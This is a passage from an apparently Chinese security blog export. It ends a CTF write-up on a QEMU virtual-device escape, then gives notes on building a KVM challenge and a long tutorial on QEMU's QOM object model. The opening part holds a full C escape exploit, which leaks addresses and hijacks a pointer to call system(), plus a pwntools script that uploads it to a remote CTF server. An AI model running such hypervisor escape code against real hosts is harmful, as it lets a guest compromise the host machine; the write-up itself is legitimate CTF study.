&amp; PFN_PRESENT)) return -1; gfn = pme &amp; PFN_PFN; return gfn;&#125;uint64_t gva_to_gpa(void *addr)&#123; uint64_t gfn = gva_to_gfn(addr); assert(gfn != -1); return (gfn &lt;&lt; PAGE_SHIFT) | page_offset((uint64_t)addr);&#125;int main()&#123; int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC); if (mmio_fd == -1) perr("[:(]mmio_fd open failed..."); mmio_mem = mmap(0, 0x100000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0); if (mmio_mem == MAP_FAILED) perr("[:(]mmap mmio_mem failed..."); printf("[:)]mmio_mem = %p\n", mmio_mem); fd = open("/proc/self/pagemap", O_RDONLY); if (fd &lt; 0) &#123; perror("open"); exit(1); &#125; uint8_t *ptr0,*ptr1,*ptr2,*ptr3; uint64_t ptr0_mem,ptr1_mem,ptr2_mem,ptr3_mem; ptr1 = malloc(0xff0); ptr2 = malloc(0x900); ptr3 = malloc(0x700); memset(ptr1,'A',0xff0); memset(ptr2,'B',0x900); memset(ptr3,'C',0x700); ptr1_mem = gva_to_gpa(ptr1); ptr2_mem = gva_to_gpa(ptr2); ptr3_mem = gva_to_gpa(ptr3); printf("Your physical address is at %p\n", ptr1_mem); printf("Your physical address is at %p\n", ptr2_mem); printf("Your physical address is at %p\n", ptr3_mem); mmio_write(0x20,ptr2_mem&gt;&gt;12); mmio_write(0x10,0x1); mmio_write(0x18,0x1001); mmio_write(0x60,0xdead); getchar(); uint8_t key = *(uint8_t*)(ptr3+0x6ff); printf("key = %p\n",key); *(uint64_t*)ptr2 = ptr2_mem&gt;&gt;8; *(uint16_t*)(ptr2+0x7) = 1521; *(uint16_t*)(ptr2+0x9) = 2575; *(uint8_t*)(ptr3+0x6ff) = key+0x10; mmio_write(0x20,ptr2_mem&gt;&gt;12); mmio_write(0x10,1); mmio_write(0x18,0x1000); mmio_write(0x60,0xdead); getchar(); mmio_write(0x60,0xcafe); getchar(); uint64_t heap = *(uint64_t*)(ptr2+0x5e1); uint64_t cpu_physical_memory_rw = *(uint64_t*)(ptr2+0x5e9); printf("heap = %p\n",heap+0x9f0); printf("heap1 = %p\n",heap+0x9f0+0x806); printf("heap2 = %p\n",heap+0x9f0+0x7f8); printf("cpu_physical_memory_rw = %p\n",cpu_physical_memory_rw); uint64_t elfbase = cpu_physical_memory_rw - 0x5BC5C0; printf("elfbase = %p\n",elfbase); uint64_t system = elfbase + 0x2A7A80; mmio_write(0x10,8); mmio_write(0x18,22); mmio_write(0x50,0xaaaa); uint64_t sh_addr = 0x1000+((heap+0x9f0+0x806)&amp;0xfffffffff000); uint64_t padding_size = 0x1000-0x986; strcpy(ptr2+padding_size,"cat flag"); *(uint64_t*)(ptr2+padding_size+0x10) = sh_addr; *(uint64_t*)(ptr2+0x7f0-6) = 0x1010+((heap+0x9f0+0x806)&amp;0xfffffffff000)-0x9E0; *(uint64_t*)(ptr2+0x7f8-6) = system; getchar(); mmio_write(0x60,0xcaff); getchar(); mmio_write(0x60,0xcb00); return 0;&#125; upload123musl-gcc myexp_remote.c -Os -static -o myexp_remotestrip myexp_remotepython upload.py 123456789101112131415161718192021222324252627282930313233343536#coding:utf-8from pwn import *import commands#context.log_level = 'debug'def exec_cmd(cmd): r.sendline(cmd) r.recvuntil("# ") def upload(): p = log.progress("Upload") with open("myexp_remote","rb") as f: data = f.read() encoded = base64.b64encode(data) r.recvuntil("# ") for i in range(0,len(encoded),1000): p.status("%d / %d" % (i,len(encoded))) exec_cmd("echo \"%s\" &gt;&gt; benc" % (encoded[i:i+1000])) exec_cmd("cat ./benc | base64 -d &gt; ./bout") exec_cmd("chmod +x ./bout") log.success("success")def exploit(r): upload() r.interactive()if __name__ == "__main__": r = remote('124.70.28.14',9999) r.recvuntil('MYOS login: ') r.sendline('root') exploit(r) 结语此题逆向难度较小，利用难度中规中矩带且有一点创新，但是可能需要对物理地址的寻找方法比较熟练才能比较快的解出，不熟悉可能在调试时会遇到一些小麻烦，总体来说出的比较好，很适合只有一天时间的比赛。]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>Qemu逃逸</tag>
        <tag>RealWorld</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[KVM学习-如何利用kvm写一个自己的Hypervisor]]></title>
    <url>%2F2020%2F10%2F10%2FKVM%E5%AD%A6%E4%B9%A0%E2%80%94%E5%88%A9%E7%94%A8KVM%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%9A%84Hypervisor%2F</url>
    <content type="text"><![CDATA[前言在为TSCTF2020出题的时候，一直想往赛题里加一点kernel和虚拟化的元素进去，但是常规的kernel题或者虚拟机逃逸又太套路了很没意思，后来在查资料的时候无意中看到了这个： https://github.com/david942j/kvm-kernel-example KVM-Kernel ExampleThe source code are examples on my blog: Learning KVM - implement your own kernel. I’ve described how to implement a KVM-based hypervisor and the key points to implement a kernel on my blog. You can leave comments in the blog or file issues here if you have questions or find any bug. david942j巨佬(没错，就是开发one_gadget的那个湾湾巨佬)的一个小项目，用kvm跑一个自己开发的小型内核，然后我觉得非常有意思，就想以此为基础出一道多层的pwn题目，但是在开发方面我比较弱，所以计划用两周时间改学习进此小项目，然后再花一周构思题目的，但是惊喜的发现这个思路已经被大佬出成题目过了。。。是2018Hitcon的Bypass，而且有user，kernel，hypervisor三层。而且此题目的源码也已经被公布，拜读一番后觉得非常符合我的诉求，于是学习了一波之后，拿大佬的源码为基础创造了hellovirtual这道题，我只留了两层，原因有三，一是校内赛感觉两层已经足够(比赛结果证明我的想法是对的)，二是hypervisor那层大佬的原漏洞是留了一个hypercall后门，我想了一段时间没想到还能咋在hypervisor构造漏洞，三是出题时间不够了。 源码学习其有三个文件夹hypervisor，kernel，user： user文件夹就是普通的pwn用户态程序。 kernel文件夹放自定义的极简内核，其通过注册syscall_table[]来自定义系统调用实现与上层用户态通信的效果，并且通过hypercall()函数与下层的hypervisor通信。 hypervisor文件夹用kvm实现了一个小的虚拟机管理程序，并且负责处理上层kernel利用hypercall发来的I/O请求。 经典的半虚拟化I/O架构，主要分析一下kernel和hypervisor。 Hypervisormain函数位于hypervisor.c中： 1234567891011121314151617int main(int argc, char *argv[]) &#123; if(argc &lt; 3) &#123; printf("Usage: %s kernel.bin &lt;static-elf&gt; [args...]\n", argv[0]); exit(EXIT_FAILURE); &#125; alarm(60); uint8_t *code; size_t len; read_file(argv[1], &amp;code, &amp;len); if(len &gt; MAX_KERNEL_SIZE) error("Kernel size exceeded, %p &gt; MAX_KERNEL_SIZE(%p).\n", (void*) len, (void*) MAX_KERNEL_SIZE); VM* vm = kvm_init(code, len); copy_argv(vm, argc - 2, &amp;argv[2]); execute(vm);&#125; kernel出题关于EFER寄存器 https://www.cnblogs.com/alwaysking/p/12439207.html]]></content>
      <categories>
        <category>Qemu&amp;KVM学习</category>
      </categories>
      <tags>
        <tag>summary</tag>
        <tag>TSCTF</tag>
        <tag>KVM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Qemu学习-QOM模型]]></title>
    <url>%2F2020%2F08%2F12%2FQemu%E5%AD%A6%E4%B9%A0%E2%80%94QOM%E6%A8%A1%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[QOM模型Qemu自己提供了一套面向对象编程模型：QOM(QEMU Object Module)，可以把其想像为与C++的面向对象编程类似。 whyQemu中几乎所有的硬件，无论是cpu，总线，内存还是各类device，都是用这套方法实现的，其重要性可见一斑，那么我们为什么要使用QOM呢？一是因为Qemu是一款多架构硬件仿真软件，所以我们需要模拟出不同架构的cpu，这些cpu无疑会有不少共通的地方，也会有很多不同的地方，使用面向对象的方法无疑对模拟这些cpu模型带来极大的便利，类比到各类device也是一个道理，二是因为qemu模拟的是一个完整的计算机，所以只模拟设备是不够的，还需要实现设备间的互通和信息交互，所以为了方便模拟一个device会通过bus与其他的device相连接，一个device上可以通过不同的bus端口连接到其他的device，而其他的device也可以进一步通过bus与其他的设备连接，同时一个bus上也可以连接多个device等情形，使用面向对象的QOM模型是快捷方便的。 how基础结构体那么我们如何在qemu中添加一个我们自定义的device呢？官方给出的例子位于hw/misc/pci-testdev.c和hw/misc/edu.c 四个重要的数据结构： TypeInfo：是用户用来定义一个Type的工具型的数据结构。 TypeImpl：对数据类型的抽象数据结构，TypeInfo的属性与TypeImpl的属性对应。 ObjectClass：是所有类对象的基类，仅仅保存了一个整数type 。 1234567891011121314//include/qom/object.hstruct ObjectClass&#123; /*&lt; private &gt;*/ Type type; GSList *interfaces; const char *object_cast_cache[OBJECT_CLASS_CAST_CACHE]; const char *class_cast_cache[OBJECT_CLASS_CAST_CACHE]; ObjectUnparent *unparent; GHashTable *properties;&#125;; Object：是所有对象的基类Base Object，第一个成员变量为指向ObjectClass的指针。 12345678910//include/qom/object.hstruct Object&#123; /*&lt; private &gt;*/ ObjectClass *class; ObjectFree *free; GHashTable *properties; uint32_t ref; Object *parent;&#125;; QOM 创建新类型时需要指定其对象类OjectClass和对象Object，这两者通过TypeInfo 结构体指定，基本结构定义在 include/qom/object.h，文件中的注释超级详细，不仅有对数据结构的字段说明和QOM模型的用法，还有很多简单的例子，TypeImpl定义在 qom/object.c中，但是莫得注释。。。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465//include/qom/object.htypedef struct TypeImpl *Type;typedef struct TypeInfo TypeInfo;struct TypeInfo&#123; const char *name; //自定义的type的名字 const char *parent;//父类type的名字 size_t instance_size;//object的size void (*instance_init)(Object *obj);//初始化object的函数 void (*instance_post_init)(Object *obj); void (*instance_finalize)(Object *obj); bool abstract; size_t class_size; //object class的size void (*class_init)(ObjectClass *klass, void *data); //初始化object class的函数 void (*class_base_init)(ObjectClass *klass, void *data); void *class_data; InterfaceInfo *interfaces;&#125;;//各字段的具体解释/** * TypeInfo: * @name: The name of the type. * @parent: The name of the parent type. * @instance_size: The size of the object (derivative of #Object). If * @instance_size is 0, then the size of the object will be the size of the * parent object. * @instance_init: This function is called to initialize an object. The parent * class will have already been initialized so the type is only responsible * for initializing its own members. * @instance_post_init: This function is called to finish initialization of * an object, after all @instance_init functions were called. * @instance_finalize: This function is called during object destruction. This * is called before the parent @instance_finalize function has been called. * An object should only free the members that are unique to its type in this * function. * @abstract: If this field is true, then the class is considered abstract and * cannot be directly instantiated. * @class_size: The size of the class object (derivative of #ObjectClass) * for this object. If @class_size is 0, then the size of the class will be * assumed to be the size of the parent class. This allows a type to avoid * implementing an explicit class type if they are not adding additional * virtual functions. * @class_init: This function is called after all parent class initialization * has occurred to allow a class to set its default virtual method pointers. * This is also the function to use to override virtual methods from a parent * class. * @class_base_init: This function is called for all base classes after all * parent class initialization has occurred, but before the class itself * is initialized. This is the function to use to undo the effects of * memcpy from the parent class to the descendants. * @class_finalize: This function is called during class destruction and is * meant to release and dynamic parameters allocated by @class_init. * @class_data: Data to pass to the @class_init, @class_base_init and * @class_finalize functions. This can be useful when building dynamic * classes. * @interfaces: The list of interfaces associated with this type. This * should point to a static array that's terminated with a zero filled * element. */ 123456789101112131415161718192021222324252627282930//qom/object.ctypedef struct TypeImpl TypeImpl;struct TypeImpl&#123; const char *name; size_t class_size; size_t instance_size; void (*class_init)(ObjectClass *klass, void *data); void (*class_base_init)(ObjectClass *klass, void *data); void *class_data; void (*instance_init)(Object *obj); void (*instance_post_init)(Object *obj); void (*instance_finalize)(Object *obj); bool abstract; const char *parent; TypeImpl *parent_type; ObjectClass *class; //初始化Class!!! int num_interfaces; InterfaceImpl interfaces[MAX_INTERFACES];&#125;; 自定义一个设备主要分为四个流程： 将TypeInfo注册为TypeImpl 初始化Class 实例化Object 添加Property 将TypeInfo注册为TypeImpl用户定义了一个TypeInfo，然后调用 type_register(TypeInfo) 或者 type_register_static(TypeInfo) 函数，就会生成相应的TypeImpl实例，将这个TypeInfo注册到全局的TypeImpl的hash表中。TypeInfo的属性与TypeImpl的属性对应，实际上qemu就是通过用户提供的TypeInfo创建的TypeImpl的对象。 拿include/qom/object.h中第一阶段的例子来看： 1234567891011121314151617181920212223242526272829303132//include/qom/object.h * &lt;example&gt; * &lt;title&gt;Creating a minimal type&lt;/title&gt; * &lt;programlisting&gt; * #include "qdev.h" * * #define TYPE_MY_DEVICE "my-device" * * // No new virtual functions: we can reuse the typedef for the * // superclass. * typedef DeviceClass MyDeviceClass; * typedef struct MyDevice * &#123; * DeviceState parent; //父对象必须是该对象数据结构的第一个属性,以便实现父对象向子对象的cast,DeviceState继承自Object,后续会详细解释 * * int reg0, reg1, reg2; * &#125; MyDevice; * * static const TypeInfo my_device_info = &#123; //用户自定义一个TypeInfo * .name = TYPE_MY_DEVICE, * .parent = TYPE_DEVICE, * .instance_size = sizeof(MyDevice), //Object的size必须注明,以便系统为Object分配内存 * &#125;; * * static void my_device_register_types(void) * &#123; * type_register_static(&amp;my_device_info); //用type_register_static生成相应的TypeImpl实例 * &#125; * * type_init(my_device_register_types)//通过type_init宏注册Type * &lt;/programlisting&gt; * &lt;/example&gt; 在my_device_info中得字段name定义了我们将来启动此设备时候传参-device后面跟的值。 type_init宏位于include/qemu/module.h，其发生在qemu的main函数之前。 12//include/qemu/module.h#define type_init(function) module_init(function, MODULE_INIT_QOM) 这一过程的目的就是分配并创建TypeImpl结构，使用TypeInfo数据赋值，之后插入到一个hash表之中，这个hash表以ti-&gt;name，也就是info-&gt;name为key，value就是根据TypeInfo生成的TypeImpl。在qemu启动阶段vl.c:main()，pci_testdev_register_types()函数将会在module_call_init(MODULE_INIT_QOM)中执行，通过遍历qom队列中的module entry。 初始化Class之后的分析主要根据hw/misc/pci-testdev.c来分析，其中模拟了一个pci-test设备： 继承链：首先我们要知道ObjectClass是所有类的基类，对于pci设备来说，ObjectClass有以下继承链： PCIDeviceClass=&gt;DeviceClass=&gt;ObjectClass 1234567891011121314//include/qom/object.hstruct ObjectClass&#123; /*&lt; private &gt;*/ Type type; GSList *interfaces; const char *object_cast_cache[OBJECT_CLASS_CAST_CACHE]; const char *class_cast_cache[OBJECT_CLASS_CAST_CACHE]; ObjectUnparent *unparent; GHashTable *properties;&#125;; 123456789101112131415161718192021222324252627282930313233343536//include/hw/xtensa/qdev-core.htypedef struct DeviceClass &#123; /*&lt; private &gt;*/ ObjectClass parent_class;//存储父类型的内容 /*&lt; public &gt;*/ DECLARE_BITMAP(categories, DEVICE_CATEGORY_MAX); const char *fw_name;//firware名称 const char *desc; Property *props;//属性，在qemu中，每个设备都有各自的属性，以链表的形式保存在设备的根结构Object的properties字段中。但是每个设备有哪些属性，是在设备的类型中定义的，即这里的properties字段定义设备有哪些属性，设备类型的继承链上每个子类型都有可能定义一些属性，在设备初始化时，会遍历设备类型继承链，把所有属性都存放到Object的属性链表中 /* * Can this device be instantiated with -device / device_add? * All devices should support instantiation with device_add, and * this flag should not exist. But we're not there, yet. Some * devices fail to instantiate with cryptic error messages. * Others instantiate, but don't work. Exposing users to such * behavior would be cruel; clearing this flag will protect them. * It should never be cleared without a comment explaining why it * is cleared. * TODO remove once we're there */ bool user_creatable;//设备是否是可以由用户创建的，QEMU中并不是所有模拟的设备都是可以由用户通过命令行创建的，有些设备是要QEMU自动创建的，比如sysbus总线设备 bool hotpluggable;//设备是否是可插拔的 /* callbacks */ DeviceReset reset;//设备复位回调函数 DeviceRealize realize;//设备实例化回调函数。qemu的设备初始化分为两步，一个是设备类型中定义的构造函数(instance_init)，创建设备(object_new)时调用，另外一个是这里的realize函数，在设备的realied属性被设置为true时调用，realize函数被调用设备才是真正的被初始化并变的可用 DeviceUnrealize unrealize;//与realize回调函数对应，设备清理时调用 /* device state */ const struct VMStateDescription *vmsd;//该结构体用来保存设备的状态，在虚拟机迁移或冻结时使用 /* Private to qdev / bus. */ const char *bus_type;//总线类型，在qdev的设备模型中，每个设备都有其挂接的总线&#125; DeviceClass; 1234567891011121314151617181920212223242526//include/hw/pci/pci.htypedef struct PCIDeviceClass &#123; DeviceClass parent_class; void (*realize)(PCIDevice *dev, Error **errp); PCIUnregisterFunc *exit; PCIConfigReadFunc *config_read; PCIConfigWriteFunc *config_write; uint16_t vendor_id; uint16_t device_id; uint8_t revision; uint16_t class_id; uint16_t subsystem_vendor_id; /* only for header type = 0 */ uint16_t subsystem_id; /* only for header type = 0 */ /* * pci-to-pci bridge or normal device. * This doesn't mean pci host switch. * When card bus bridge is supported, this would be enhanced. */ int is_bridge; /* rom bar */ const char *romfile;&#125; PCIDeviceClass; 接着上一大步，现在我们已经有了一个value为TypeImpl的哈希表。下一步就是初始化表中的每个type了，这一步可以看成是Class的初始化，可以理解成每一个type对应了一个class，接下来会初始化Class。 具体函数分析：在初始化每个type时候，调用到的是type_initialize函数。ObjectClass的分配和初始化就在此函数中实现，此外ObjectClass和Type的关联操作也在此函数中实现。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556/* include/qom/object.h */struct TypeImpl;typedef struct TypeImpl *Type;/* qom/object.c */struct TypeImpl&#123; ... ObjectClass *class; //TypeImpl与ObjectClass的关联,我们就是要初始化这个元素,默认为0 ...&#125;;static void type_initialize(TypeImpl *ti)//负责将type初始化为class&#123; TypeImpl *parent; if (ti-&gt;class) &#123; //若type已经被初始化则直接退出 return; &#125; ti-&gt;class_size = type_class_get_size(ti);//获取class_size,为之后申请内存做准备,这个字段自己可以不填 ti-&gt;instance_size = type_object_get_size(ti);//获取instance_size,这个字段自己必须要填 /* Any type with zero instance_size is implicitly abstract. * This means interface types are all abstract. */ if (ti-&gt;instance_size == 0) &#123; ti-&gt;abstract = true; &#125; if (type_is_ancestor(ti, type_interface)) &#123; ... &#125; ti-&gt;class = g_malloc0(ti-&gt;class_size);//为class申请内存 parent = type_get_parent(ti); if (parent) &#123; //递归初始化父类type的class type_initialize(parent); ... memcpy(ti-&gt;class, parent-&gt;class, parent-&gt;class_size);//将父类的class拷贝到自己的最前面 ... &#125; else &#123; ti-&gt;class-&gt;properties = g_hash_table_new_full( g_str_hash, g_str_equal, g_free, object_property_free); &#125; ti-&gt;class-&gt;type = ti;//将当前type初始化出的class的type指向自己 while (parent) &#123; if (parent-&gt;class_base_init) &#123; parent-&gt;class_base_init(ti-&gt;class, ti-&gt;class_data); &#125; parent = type_get_parent(parent); &#125; if (ti-&gt;class_init) &#123; ti-&gt;class_init(ti-&gt;class, ti-&gt;class_data);//调用class_init函数,class指针作为第一个参数,初始化class &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940static TypeImpl *type_get_parent(TypeImpl *type)&#123; if (!type-&gt;parent_type &amp;&amp; type-&gt;parent) &#123; type-&gt;parent_type = type_get_by_name(type-&gt;parent); g_assert(type-&gt;parent_type != NULL); &#125; return type-&gt;parent_type;&#125;static bool type_has_parent(TypeImpl *type)&#123; return (type-&gt;parent != NULL);&#125;static size_t type_class_get_size(TypeImpl *ti)&#123; if (ti-&gt;class_size) &#123;//填了直接返回 return ti-&gt;class_size; &#125; if (type_has_parent(ti)) &#123; return type_class_get_size(type_get_parent(ti)); &#125; return sizeof(ObjectClass);//默认返回sizeof(ObjectClass),或为父类的class_size&#125;static size_t type_object_get_size(TypeImpl *ti)&#123; if (ti-&gt;instance_size) &#123;//填了直接返回 return ti-&gt;instance_size; &#125; if (type_has_parent(ti)) &#123; return type_object_get_size(type_get_parent(ti)); &#125; return 0;//默认返回0,或为父类的instance_size,所以在自定义设备时这个位置一定要填&#125; 在type_initialize中，会递归地对TypeImpl中的parent成员(TypeImpl)递归调用type_initialize，然后将创建出来的相应 ObjectClass拷贝到自己class的最前面。 类对象的第一个成员是parent_class，由于父类对象会拷到子类对象的最前面，因此可以认为其指向父类的对象，如此构成链状的继承链，最终指向基类对象ObjectClass。 可以发现Type同样存在一条继承链，对于pci设备而言： TYPE_PCI_TEST_DEV(自定义)=&gt;TYPE_PCI_DEVICE=&gt;TYPE_DEVICE=&gt;TYPE_OBJECT class_init为我们自己自定义的初始化class的函数，可以类比为C++中的构造函数，其参数为自身，在定义TypeInfo时填入： 1234567891011121314151617// hw/misc/pci-testdev.cstatic void pci_testdev_class_init(ObjectClass *klass, void *data)&#123; //父对象必须是该对象数据结构的第一个属性，以便实现父对象向子对象的cast DeviceClass *dc = DEVICE_CLASS(klass); //子类转父类的宏 PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);//子类转父类的宏 k-&gt;realize = pci_testdev_realize; //回调函数,负责初始化Type的ObjectClass实例 k-&gt;exit = pci_testdev_uninit; k-&gt;vendor_id = PCI_VENDOR_ID_REDHAT; k-&gt;device_id = PCI_DEVICE_ID_REDHAT_TEST; k-&gt;revision = 0x00; k-&gt;class_id = PCI_CLASS_OTHERS; dc-&gt;desc = "PCI Test Device"; set_bit(DEVICE_CATEGORY_MISC, dc-&gt;categories); dc-&gt;reset = qdev_pci_testdev_reset;&#125; DEVICE_CLASS和PCI_DEVICE_CLASS两个宏由OBJECT_CLASS_CHECK封装： 1234567891011121314151617181920212223/* include/hw/qdev-core.h */#define TYPE_DEVICE "device"#define DEVICE_CLASS(klass) OBJECT_CLASS_CHECK(DeviceClass, (klass), TYPE_DEVICE)/* include/hw/pci/pci.h */#define TYPE_PCI_DEVICE "pci-device"#define PCI_DEVICE_CLASS(klass) \ OBJECT_CLASS_CHECK(PCIDeviceClass, klass, TYPE_PCI_DEVICE)/* include/qom/object.h *//** * OBJECT_CLASS_CHECK: * @class_type: The C type to use for the return value. * @class: A derivative class of @class_type to cast. * @name: the QOM typename of @class_type. * * A type safe version of @object_class_dynamic_cast_assert. This macro is * typically wrapped by each type to perform type safe casts of a class to a * specific class type. */#define OBJECT_CLASS_CHECK(class_type, class, name) \ ((class_type *)object_class_dynamic_cast_assert(OBJECT_CLASS(class), (name), \ __FILE__, __LINE__, __func__)) 流程概况：12345678910type_initialize=&gt; 如果 TypeImpl 已创建(class成员有值)，返回=&gt; ti-&gt;class = g_malloc0(ti-&gt;class_size) //根据class_size分配内存空间=&gt; type_get_parent(ti) //获取父类的TypeImpl=&gt; memcpy(ti-&gt;class, parent-&gt;class, parent-&gt;class_size) //将parent的class拷贝到自己class的最前面=&gt; ti-&gt;class-&gt;properties = g_hash_table_new_full //创建存放property的hash table=&gt; type_initialize_interface //初始化class的接口，包括父类和自己的=&gt; ti-&gt;class-&gt;type = ti //设置class的type为对应TypeImpl=&gt; parent-&gt;class_base_init //如果parent定义了class_base_init，调用之=&gt; ti-&gt;class_init(ti-&gt;class, ti-&gt;class_data) //调用class的class_init 实例化Object用户定义的PCI Type的ObjectClass实例的构造函数调用在type_register_static()调用时即可完成，而Type的Object实例只有在QEMU命令行中添加-device选项时才会创建。上面已经说到了Type hash table的构造以及Class的初始化，现在来说Object实例的创建。 继承链：首先还是继承链，对于基础的pci设备来说有以下继承链： PCIDevice=&gt;DeviceState=&gt;Object 12345678910//include/qom/object.hstruct Object&#123; /*&lt; private &gt;*/ ObjectClass *class; //与ObjectClass联系在一起 ObjectFree *free; GHashTable *properties; uint32_t ref; Object *parent;&#125;; 12345678910111213141516171819//include/hw/xtensa/qdev-core.hstruct DeviceState &#123; /*&lt; private &gt;*/ Object parent_obj; /*&lt; public &gt;*/ const char *id; char *canonical_path; bool realized; bool pending_deleted_event; QemuOpts *opts; int hotplugged; BusState *parent_bus; QLIST_HEAD(, NamedGPIOList) gpios; QLIST_HEAD(, BusState) child_bus; int num_child_bus; int instance_id_alias; int alias_required_for_version;&#125;; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091//include/hw/pci/pci.hstruct PCIDevice &#123; DeviceState qdev; /* PCI config space */ uint8_t *config; /* Used to enable config checks on load. Note that writable bits are * never checked even if set in cmask. */ uint8_t *cmask; /* Used to implement R/W bytes */ uint8_t *wmask; /* Used to implement RW1C(Write 1 to Clear) bytes */ uint8_t *w1cmask; /* Used to allocate config space for capabilities. */ uint8_t *used; /* the following fields are read only */ int32_t devfn; /* Cached device to fetch requester ID from, to avoid the PCI * tree walking every time we invoke PCI request (e.g., * MSI). For conventional PCI root complex, this field is * meaningless. */ PCIReqIDCache requester_id_cache; char name[64]; PCIIORegion io_regions[PCI_NUM_REGIONS]; AddressSpace bus_master_as; MemoryRegion bus_master_container_region; MemoryRegion bus_master_enable_region; /* do not access the following fields */ PCIConfigReadFunc *config_read; PCIConfigWriteFunc *config_write; /* Legacy PCI VGA regions */ MemoryRegion *vga_regions[QEMU_PCI_VGA_NUM_REGIONS]; bool has_vga; /* Current IRQ levels. Used internally by the generic PCI code. */ uint8_t irq_state; /* Capability bits */ uint32_t cap_present; /* Offset of MSI-X capability in config space */ uint8_t msix_cap; /* MSI-X entries */ int msix_entries_nr; /* Space to store MSIX table &amp; pending bit array */ uint8_t *msix_table; uint8_t *msix_pba; /* MemoryRegion container for msix exclusive BAR setup */ MemoryRegion msix_exclusive_bar; /* Memory Regions for MSIX table and pending bit entries. */ MemoryRegion msix_table_mmio; MemoryRegion msix_pba_mmio; /* Reference-count for entries actually in use by driver. */ unsigned *msix_entry_used; /* MSIX function mask set or MSIX disabled */ bool msix_function_masked; /* Version id needed for VMState */ int32_t version_id; /* Offset of MSI capability in config space */ uint8_t msi_cap; /* PCI Express */ PCIExpressDevice exp; /* SHPC */ SHPCDevice *shpc; /* Location of option rom */ char *romfile; bool has_rom; MemoryRegion rom; uint32_t rom_bar; /* INTx routing notifier */ PCIINTxRoutingNotifier intx_routing_notifier; /* MSI-X notifiers */ MSIVectorUseNotifier msix_vector_use_notifier; MSIVectorReleaseNotifier msix_vector_release_notifier; MSIVectorPollNotifier msix_vector_poll_notifier;&#125;; Object继承类之间的转换依然是靠宏来实现： 12345678910111213141516171819202122232425/* include/hw/qdev-core.h */#define TYPE_DEVICE "device"#define DEVICE(obj) OBJECT_CHECK(DeviceState, (obj), TYPE_DEVICE)/* include/hw/pci/pci.h */#define PCI_DEVICE(obj) \ OBJECT_CHECK(PCIDevice, obj, TYPE_PCI_DEVICE)/* include/qom/object.h *//** * OBJECT_CHECK: * @type: The C type to use for the return value. * @obj: A derivative of @type to cast. * @name: The QOM typename of @type * * A type safe version of @object_dynamic_cast_assert. Typically each class * will define a macro based on this type to perform type safe dynamic_casts to * this object type. * * If an invalid object is passed to this function, a run time assert will be * generated. */#define OBJECT_CHECK(type, obj, name) \ ((type *)object_dynamic_cast_assert(OBJECT(obj), (name), \ __FILE__, __LINE__, __func__)) 具体函数分析：object_new(typename)函数是实例化instance的入口： 1234567// qom/object.cObject *object_new(const char *typename)&#123; TypeImpl *ti = type_get_by_name(typename); //用typename去哈希表中获取对应的TypeImpl指针 return object_new_with_type(ti); //以指向TypeImpl的指针为参数去实例化对象&#125; 继续看object_new_with_type函数： 123456789101112131415161718/* include/qom/object.h */struct TypeImpl;typedef struct TypeImpl *Type;// qom/object.cstatic Object *object_new_with_type(Type type)&#123; Object *obj; g_assert(type != NULL); type_initialize(type); //先初始化TypeImpl-&gt;class,流程参见上一部分 obj = g_malloc(type-&gt;instance_size);//申请实例的内存 object_initialize_with_type(obj, type-&gt;instance_size, type);//创建instance对象的核心函数,申请出的内存指针作为第一个参数,instance的size作为第二个参数,指向TypeImpl的指针type作为第三个参数 obj-&gt;free = g_free; return obj;&#125; 继续看object_initialize_with_type函数： 1234567891011121314151617181920// qom/object.cstatic void object_initialize_with_type(void *data, size_t size, TypeImpl *type)&#123; Object *obj = data;//obj指向申请出来的用于存放instance的内存空间,size为TypeImpl-&gt;instance_size g_assert(type != NULL); type_initialize(type);//再次初始化class,应该是个检测的步骤,已经初始化了这里会直接退出 g_assert(type-&gt;instance_size &gt;= sizeof(Object)); g_assert(type-&gt;abstract == false); g_assert(size &gt;= type-&gt;instance_size); memset(obj, 0, type-&gt;instance_size);//清空脏数据 obj-&gt;class = type-&gt;class; //此字段为instance与其对应class的联系 object_ref(obj); obj-&gt;properties = g_hash_table_new_full(g_str_hash, g_str_equal, NULL, object_property_free);//创建存放类实例对象property的hash table object_init_with_type(obj, type); //一个的迭代函数 object_post_init_with_type(obj, type);&#125; 继续看object_init_with_type函数： 1234567891011// qom/object.cstatic void object_init_with_type(Object *obj, TypeImpl *ti)&#123; if (type_has_parent(ti)) &#123; //若存在parent,则递归调用object_init_with_type初始化所有parent的instance object_init_with_type(obj, type_get_parent(ti)); &#125; if (ti-&gt;instance_init) &#123; ti-&gt;instance_init(obj); //若定义了ti-&gt;instance_init函数,则调用其来为instance做初始化 &#125;&#125; instance的初始化的核心过程到这就结束了，虽然instance_init是字面意义上的实例构造函数，但实际上，经过instance_init函数初始化设备对应instance后，这个instance是不能直接使用的。其真正初始化逻辑的大头都放在realize(如：k-&gt;realize = pci_testdev_realize)中做，比如创建对应的memory region，挂载到对应bus上等等。只有在realize后，设备才算真正构造完成，可以拿来使用，所以实例的创建主要由realize函数实现，且不同于type和class的构造，instance是根据实际需要创建的，只有在命令行指定了设备或者是热插一个设备之后才会有实例的创建。 realize函数是设备实例化callback/回调函数。qemu的设备初始化分为两步，一个是设备类型中定义的构造函数(instance_init)，创建设备(object_new)时调用，另外一个是这里的realize函数，在设备的realied属性被设置为true时调用，realize函数被调用设备才是真正的被初始化并变的可用。 此外需要留意class和instance之间是通过instance的class字段联系在一起的。 流程概况：12345678910111213141516main =&gt; configure_accelerator =&gt; accel_init_machine(acc, ms)=&gt; ObjectClass *oc = OBJECT_CLASS(acc) //将AccelClass指针转换成父类(ObjectClass)指针=&gt; object_class_get_name //获取ObjectClass-&gt;TypeImpl的类名，如kvm-accel=&gt; ACCEL(object_new(cname)) //利用名称创建AccelState对象=&gt; acc-&gt;init_machine(ms) //初始化machine，实际上是调用kvm_initobject_new=&gt; type_get_by_name(typename) 